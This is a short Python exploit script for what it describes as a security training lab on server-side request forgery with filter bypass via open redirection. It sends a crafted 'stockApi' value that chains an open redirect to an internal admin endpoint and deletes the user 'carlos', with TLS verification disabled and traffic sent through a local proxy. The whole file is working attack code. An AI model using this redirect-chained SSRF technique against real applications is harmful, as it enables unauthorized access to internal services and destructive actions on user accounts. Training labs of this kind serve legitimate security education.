import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def delete_user(url):
    # DELETER USER
    stock_url = url + '/product/stock'
    params = {
        'stockApi' : '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos'
    }
    r = requests.post(stock_url, data=params,verify=False, proxies=proxies)
    if "User deleted successfully!" in r.text:
        print("[+] Exploit succeeded! User carlos deleted!")
        sys.exit(-1)
    print("[-] Error!")
    sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: SSRF with filter bypass via open redirection vulnerability")
    print("""This lab has a stock check feature which fetches data from an internal system.
    To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
    The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.""")

    delete_user(url)

if __name__ == "__main__":
    main()